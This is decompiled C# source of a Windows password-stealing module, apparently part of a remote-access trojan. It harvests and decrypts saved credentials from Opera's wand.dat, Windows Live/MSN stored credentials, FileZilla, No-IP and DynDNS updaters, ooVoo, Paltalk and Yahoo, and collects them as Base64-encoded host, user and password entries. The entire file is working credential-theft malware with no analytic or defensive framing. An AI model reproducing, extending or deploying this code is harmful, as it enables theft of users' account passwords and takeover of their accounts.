using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace pw.pw
{
	// Token: 0x0200000E RID: 14
	[StandardModule]
	internal sealed class p
	{
		// Token: 0x06000032 RID: 50
		[DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		public static extern bool CredEnumerateW(string filter, uint flag, out uint count, out IntPtr pCredentials);

		// Token: 0x06000033 RID: 51 RVA: 0x00038E70 File Offset: 0x00037270
		public static object decrypt2_method(byte[] key, byte[] encrypt_data)
		{
			checked
			{
				object obj = 0;
				try
				{
					MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
					md5CryptoServiceProvider.Initialize();
					byte[] array = new byte[p.opera_salt.Length + (key.Length - 1) + 1 - 1 + 1];
					Array.Copy(p.opera_salt, array, p.opera_salt.Length);
					Array.Copy(key, 0, array, p.opera_salt.Length, key.Length);
					byte[] array2 = md5CryptoServiceProvider.ComputeHash(array);
					array = new byte[array2.Length + p.opera_salt.Length + (key.Length - 1) + 1 - 1 + 1];
					Array.Copy(array2, array, array2.Length);
					Array.Copy(p.opera_salt, 0, array, array2.Length, p.opera_salt.Length);
					Array.Copy(key, 0, array, array2.Length + p.opera_salt.Length, key.Length);
					byte[] array3 = md5CryptoServiceProvider.ComputeHash(array);
					TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
					tripleDESCryptoServiceProvider.Mode = CipherMode.CBC;
					tripleDESCryptoServiceProvider.Padding = PaddingMode.None;
					byte[] array4 = new byte[24];
					byte[] array5 = new byte[8];
					Array.Copy(array2, array4, array2.Length);
					Array.Copy(array3, 0, array4, array2.Length, 8);
					Array.Copy(array3, 8, array5, 0, 8);
					tripleDESCryptoServiceProvider.Key = array4;
					tripleDESCryptoServiceProvider.IV = array5;
					byte[] array6 = tripleDESCryptoServiceProvider.CreateDecryptor().TransformFinalBlock(encrypt_data, 0, encrypt_data.Length);
					obj = Encoding.Unicode.GetString(array6);
				}
				catch (Exception ex)
				{
					obj = "";
				}
				return obj;
			}
		}

		// Token: 0x06000034 RID: 52 RVA: 0x00039000 File Offset: 0x00037400
		public static void DUC3()
		{
			p.OLADD("");
			try
			{
				string text = "";
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Vitalwerks\\DUC\\v3", false);
				text = Conversions.ToString(RuntimeHelpers.GetObjectValue(registryKey.GetValue("CID", "")));
				if (Operators.CompareString(text, "", false) != 0)
				{
					string[] array = new string[5];
					string text2 = "http://www.noip.com/";
					array[0] = p.ENB(ref text2);
					array[1] = ":";
					array[2] = p.ENB(ref text);
					array[3] = ":";
					string[] array2 = array;
					int num = 4;
					string text3 = Conversions.ToString(RuntimeHelpers.GetObjectValue(registryKey.GetValue("CKey", "")));
					array2[num] = p.ENB(ref text3);
					p.OLADD(string.Concat(array));
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000035 RID: 53 RVA: 0x000390F0 File Offset: 0x000374F0
		public static void dyn()
		{
			checked
			{
				try
				{
					p.OLADD("");
					string text = Strings.Replace(Interaction.Environ("ALLUSERSPROFILE") + "\\", "\\\\", "\\", 1, -1, CompareMethod.Binary) + "DynDNS\\Updater\\config.dyndns";
					if (File.Exists(text))
					{
						Array array = File.ReadAllLines(text);
						try
						{
							foreach (object obj in array)
							{
								string text2 = Conversions.ToString(RuntimeHelpers.GetObjectValue(obj));
								string text3 = null;
								if (Strings.InStr(text2.ToLower(), "username=", CompareMethod.Binary) > 0)
								{
									text3 = Strings.Split(text2, "=", -1, CompareMethod.Binary)[1];
								}
								if (Strings.InStr(text2.ToLower(), "password=", CompareMethod.Binary) > 0)
								{
									string text4 = Strings.Split(text2, "=", -1, CompareMethod.Binary)[1];
									int num = Strings.Len(text4);
									string text5 = null;
									for (int i = 1; i <= num; i += 2)
									{
										text5 += Conversions.ToString(Strings.Chr((int)Math.Round(Math.Round(Conversion.Val("&H" + Strings.Mid(text4, i, 2))))));
									}
									int num2 = Strings.Len(text5);
									for (int j = 1; j <= num2; j++)
									{
										int num3 = 0;
										StringType.MidStmtStr(ref text5, j, 1, Conversions.ToString(Strings.Chr(Strings.Asc(Strings.Mid(text5, j, 1)) ^ Strings.Asc(Strings.Mid("t6KzXhCh", num3 + 1, 1)))));
										num3 = (num3 + 1) % 8;
									}
									if (text3.Length != 0)
									{
										string[] array2 = new string[5];
										string text6 = "http://DynDns.com";
										array2[0] = p.ENB(ref text6);
										array2[1] = ":";
										array2[2] = p.ENB(ref text3);
										array2[3] = ":";
										array2[4] = p.ENB(ref text5);
										p.OLADD(string.Concat(array2));
									}
									break;
								}
							}
						}
						finally
						{
							
						}
					}
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x06000036 RID: 54 RVA: 0x00039330 File Offset: 0x00037730
		public static string ENB(ref string s)
		{
			return Convert.ToBase64String(Encoding.UTF8.GetBytes(s));
		}

		// Token: 0x06000037 RID: 55 RVA: 0x00039350 File Offset: 0x00037750
		public static string FL(string s)
		{
			string text = "abcdefghijklmnopqrstuvwxyz1234567890_-.~!@#$%^&*()[{]}\\|';:,<>/?+=";
			string text2 = "";
			int i = 0;
			int length = s.Length;
			checked
			{
				while (i < length)
				{
					string text3 = Conversions.ToString(s[i]);
					if (text.Contains(text3.ToLower()))
					{
						text2 += text3;
					}
					i++;
				}
				return text2;
			}
		}

		// Token: 0x06000038 RID: 56 RVA: 0x000393AC File Offset: 0x000377AC
		public static void GetOpera()
		{
			p.OL.Add("*");
			if (File.Exists(p.path + "\\Opera\\Opera\\wand.dat"))
			{
				p.path += "\\Opera\\Opera\\wand.dat";
			}
			else if (File.Exists(p.path + "\\Opera\\Opera\\profile\\wand.dat"))
			{
				p.path += "\\Opera\\Opera\\profile\\wand.dat";
			}
			checked
			{
				try
				{
					byte[] array = File.ReadAllBytes(p.path);
					int num = array.Length - 5;
					for (int i = 0; i <= num; i++)
					{
						if (array[i] == 0 && array[i + 1] == 0 && array[i + 2] == 0 && array[i + 3] == 8)
						{
							int num2 = (int)array[i + 15];
							byte[] array2 = new byte[8];
							byte[] array3 = new byte[num2 - 1 + 1 - 1 + 1];
							Array.Copy(array, i + 4, array2, 0, array2.Length);
							Array.Copy(array, i + 16, array3, 0, array3.Length);
							p.DOutput = Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.AddObject(p.DOutput, RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(p.decrypt2_method(array2, array3)), "\r\n")))));
							i += 11 + num2;
						}
					}
					string[] array4 = Strings.Split(p.DOutput, "\r\n", -1, CompareMethod.Binary);
					int num3 = array4.Length - 1;
					for (int j = 0; j <= num3; j++)
					{
						string text = p.FL(array4[j]);
						string text2 = "";
						string text3 = "";
						string text4 = "";
						if (text.ToLower().StartsWith("http://") | text.ToLower().StartsWith("https://"))
						{
							text2 = text;
							if (j + 2 < array4.Length)
							{
								int num4 = j + 2;
								for (int k = j + 1; k <= num4; k++)
								{
									string text5 = array4[k];
									if (text5.ToLower().StartsWith("http://") | text5.ToLower().StartsWith("https://"))
									{
										break;
									}
									if (k == j + 2)
									{
										text3 = p.FL(text5);
									}
								}
							}
							if (j + 4 < array4.Length)
							{
								int num5 = j + 4;
								for (int l = j + 1; l <= num5; l++)
								{
									string text6 = array4[l];
									if (text6.ToLower().StartsWith("http://") | text6.ToLower().StartsWith("https://"))
									{
										break;
									}
									if (l == j + 4)
									{
										text4 = p.FL(text6);
									}
								}
							}
							if (!((Operators.CompareString(text3, "", false) == 0) & (Operators.CompareString(text4, "", false) == 0)))
							{
								p.OLADD(string.Concat(new string[]
								{
									p.ENB(ref text2),
									":",
									p.ENB(ref text3),
									":",
									p.ENB(ref text4)
								}));
							}
						}
					}
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x06000039 RID: 57
		[DllImport("kernel32", CharSet = CharSet.Ansi, EntryPoint = "GetVolumeInformationA", ExactSpelling = true, SetLastError = true)]
		private static extern int GetVolumeInformation([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpRootPathName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpVolumeNameBuffer, int nVolumeNameSize, ref int lpVolumeSerialNumber, ref int lpMaximumComponentLength, ref int lpFileSystemFlags, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileSystemNameBuffer, int nFileSystemNameSize);

		// Token: 0x0600003A RID: 58 RVA: 0x000396D4 File Offset: 0x00037AD4
		public static string HWD()
		{
			string text4;
			try
			{
				string text = null;
				int num = 0;
				int num2 = 0;
				string text2 = null;
				string text3 = Interaction.Environ("SystemDrive") + "\\";
				int num3 = 0;
				p.GetVolumeInformation(ref text3, ref text, 0, ref num3, ref num, ref num2, ref text2, 0);
				text4 = Conversion.Hex(num3);
			}
			catch (Exception ex)
			{
				text4 = "ERR";
			}
			return text4;
		}

		// Token: 0x0600003B RID: 59 RVA: 0x00039758 File Offset: 0x00037B58
		public static void Msn()
		{
			p.OLADD("");
			checked
			{
				try
				{
					IntPtr zero = IntPtr.Zero;
					uint num = 0;
					if (p.CredEnumerateW("WindowsLive:name=*", 0U, out num, out zero))
					{
						int num2 = (int)(unchecked((ulong)num) - 1UL);
						for (int i = 0; i <= num2; i++)
						{
							try
							{
								string text = "http://hotmail.com";
								string text2 = p.ENB(ref text) + ":";
								p.CREDENTIAL credential = (p.CREDENTIAL)Marshal.PtrToStructure(Marshal.ReadIntPtr(zero, IntPtr.Size * i), typeof(p.CREDENTIAL));
								text2 = text2 + p.ENB(ref credential.UserName) + ":";
								try
								{
									string text3 = text2;
									string text4 = Marshal.PtrToStringBSTR(credential.CredentialBlob);
									text2 = text3 + p.ENB(ref text4);
								}
								catch (Exception ex)
								{
								}
								p.OLADD(text2);
							}
							catch (Exception ex2)
							{
							}
						}
					}
				}
				catch (Exception ex3)
				{
				}
			}
		}

		// Token: 0x0600003C RID: 60 RVA: 0x000398B0 File Offset: 0x00037CB0
		public static void OLADD(string S)
		{
			if (Operators.CompareString(S, "", false) == 0)
			{
				p.OL.Add("*");
			}
			else if (!p.OL.Contains(S))
			{
				p.OL.Add(S);
			}
		}

		// Token: 0x0600003D RID: 61 RVA: 0x000398EC File Offset: 0x00037CEC
		public static void OOVOO()
		{
			p.OLADD("");
			try
			{
				string text = "";
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\ooVoo\\Settings\\User", false);
				text = Conversions.ToString(RuntimeHelpers.GetObjectValue(registryKey.GetValue("User", "")));
				if (Operators.CompareString(text, "", false) != 0)
				{
					string[] array = new string[5];
					string text2 = "http://www.oovoo.com/?Encrypted Password";
					array[0] = p.ENB(ref text2);
					array[1] = ":";
					array[2] = p.ENB(ref text);
					array[3] = ":";
					string[] array2 = array;
					int num = 4;
					string text3 = Conversions.ToString(RuntimeHelpers.GetObjectValue(registryKey.GetValue("Pass", "")));
					array2[num] = p.ENB(ref text3);
					p.OLADD(string.Concat(array));
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600003E RID: 62 RVA: 0x000399DC File Offset: 0x00037DDC
		public static void P1()
		{
			try
			{
				p.OLADD("");
				foreach (string text in Strings.Split(File.ReadAllText(Interaction.Environ("APPDATA") + "\\FileZilla\\recentservers.xml"), "<Server>", -1, CompareMethod.Binary))
				{
					foreach (string text2 in Strings.Split(text, "\r\n", -1, CompareMethod.Binary))
					{
						string text3 = null;
						if (text2.Contains("<Host>"))
						{
							text3 = Strings.Split(Strings.Split(text2, "<Host>", -1, CompareMethod.Binary)[1], "</Host>", -1, CompareMethod.Binary)[0];
						}
						if (text2.Contains("<Port>"))
						{
							string text4 = text3 + ":" + Strings.Split(Strings.Split(text2, "<Port>", -1, CompareMethod.Binary)[1], "</Port>", -1, CompareMethod.Binary)[0];
							text3 = p.ENB(ref text4) + ":";
						}
						if (text2.Contains("<User>"))
						{
							text3 = text3 + p.ENB(ref Strings.Split(Strings.Split(text2, "<User>", -1, CompareMethod.Binary)[1], "</User>", -1, CompareMethod.Binary)[0]) + ":";
						}
						if (text2.Contains("<Pass>"))
						{
							text3 += p.ENB(ref Strings.Split(Strings.Split(text2, "<Pass>", -1, CompareMethod.Binary)[1], "</Pass>", -1, CompareMethod.Binary)[0]);
							p.OLADD(text3);
						}
					}
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600003F RID: 63 RVA: 0x00039B98 File Offset: 0x00037F98
		public static void P2()
		{
			try
			{
				p.OLADD("");
				string text = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC";
				string text2 = Conversions.ToString(RuntimeHelpers.GetObjectValue(Registry.GetValue(text, "USERname", "")));
				string text3 = Conversions.ToString(RuntimeHelpers.GetObjectValue(Registry.GetValue(text, "Password", "")));
				if (Operators.CompareString(text2, "", false) != 0)
				{
					string[] array = new string[5];
					string text4 = "http://no-ip.com";
					array[0] = p.ENB(ref text4);
					array[1] = ":";
					array[2] = p.ENB(ref text2);
					array[3] = ":";
					array[4] = text3;
					p.OLADD(string.Concat(array));
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000040 RID: 64 RVA: 0x00039C74 File Offset: 0x00038074
		public static void paltalk()
		{
			checked
			{
				try
				{
					p.OLADD("");
					char[] array = p.HWD().ToCharArray();
					RegistryKey registryKey = Registry.CurrentUser;
					registryKey = Registry.CurrentUser.OpenSubKey("Software\\Paltalk");
					string[] subKeyNames = registryKey.GetSubKeyNames();
					registryKey.Close();
					foreach (string text in subKeyNames)
					{
                        string subkey = text;
                        string text2 = Conversions.ToString(RuntimeHelpers.GetObjectValue(Registry.GetValue("HKEY_CURRENT_USER\\Software\\Paltalk\\" + text, "pwd", "")));
						char[] array3 = text2.ToCharArray();
						string[] array4 = new string[(int)Math.Round(Math.Round((double)text2.Length / 4.0)) + 1 - 1 + 1];
						int j = 0;
						while (j <= Information.UBound(array3, 1) - 4)
						{
							int num = 0;
							if (j < Information.UBound(array3, 1) - 4)
							{
								array4[num] = Conversions.ToString(array3[j]) + Conversions.ToString(array3[j + 1]) + Conversions.ToString(array3[j + 2]);
							}
							j += 4;
							num++;
						}
						string text3 = "";
                        string text4 = subkey;
                        int k = 0;
						int length = text4.Length;
						while (k < length)
						{
							char c = text4[k];
							text3 += Conversions.ToString(c);
							int num2 = 0;
							if (num2 <= Information.UBound(array, 1))
							{
								text3 += Conversions.ToString(array[num2]);
							}
							num2++;
							k++;
						}
						text3 = text3 + text3 + text3;
						char[] array5 = text3.ToCharArray();
						string text5 = "";
						text5 += Conversions.ToString(Strings.Chr((int)Math.Round(Math.Round(unchecked(Conversions.ToDouble(array4[0]) - 122.0 - (double)Strings.Asc(text3.Substring(checked(text3.Length - 1), 1)))))));
						int num3 = Information.UBound(array4, 1);
						for (int l = 1; l <= num3; l++)
						{
							if (array4[l] != null)
							{
								char c2 = Strings.Chr((int)Math.Round(Math.Round(unchecked(Conversions.ToDouble(array4[l]) - (double)l - (double)Strings.Asc(array5[checked(l - 1)]) - 122.0))));
								text5 += Conversions.ToString(c2);
							}
						}
						string[] array6 = new string[5];
						string text6 = "http://Paltalk.com";
						array6[0] = p.ENB(ref text6);
						array6[1] = ":";
						array6[2] = p.ENB(ref subkey);
						array6[3] = ":";
						array6[4] = p.ENB(ref text5);
						p.OLADD(string.Concat(array6));
					}
				}
				catch (Exception ex)
				{
				}
			}
		}

        // Token: 0x06000041 RID: 65 RVA: 0x00039F4C File Offset: 0x0003834C
        public static void Yahoo()
        {
            try
            {
                p.OLADD("");
                foreach (string text in Registry.CurrentUser.OpenSubKey("Software\\Yahoo\\Profiles").GetSubKeyNames())
                {
                    string textCopy = text;
                    string text2 = "http://Yahoo.com";
                    p.OLADD(p.ENB(ref text2) + ":" + p.ENB(ref textCopy) + ":");
                }
            }
            catch (Exception ex)
            {
            }
        }


        // Token: 0x04000025 RID: 37
        public static string DOutput;

		// Token: 0x04000026 RID: 38
		private static byte[] key_size = new byte[] { 0, 0, 0, 8 };

		// Token: 0x04000027 RID: 39
		public static List<string> OL = new List<string>();

		// Token: 0x04000028 RID: 40
		private static byte[] opera_salt = new byte[]
		{
			131, 125, 252, 15, 142, 179, 232, 105, 115, 175,
			byte.MaxValue
		};

		// Token: 0x04000029 RID: 41
		private static string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

		// Token: 0x0200000F RID: 15
		internal struct CREDENTIAL
		{
			// Token: 0x0400002A RID: 42
			public int Flags;

			// Token: 0x0400002B RID: 43
			public int Type;

			// Token: 0x0400002C RID: 44
			[MarshalAs(UnmanagedType.LPWStr)]
			public string TargetName;

			// Token: 0x0400002D RID: 45
			[MarshalAs(UnmanagedType.LPWStr)]
			public string Comment;

			// Token: 0x0400002E RID: 46
			public long LastWritten;

			// Token: 0x0400002F RID: 47
			public int CredentialBlobSize;

			// Token: 0x04000030 RID: 48
			public IntPtr CredentialBlob;

			// Token: 0x04000031 RID: 49
			public int Persist;

			// Token: 0x04000032 RID: 50
			public int AttributeCount;

			// Token: 0x04000033 RID: 51
			public IntPtr Attributes;

			// Token: 0x04000034 RID: 52
			[MarshalAs(UnmanagedType.LPWStr)]
			public string TargetAlias;

			// Token: 0x04000035 RID: 53
			[MarshalAs(UnmanagedType.LPWStr)]
			public string UserName;
		}
	}
}
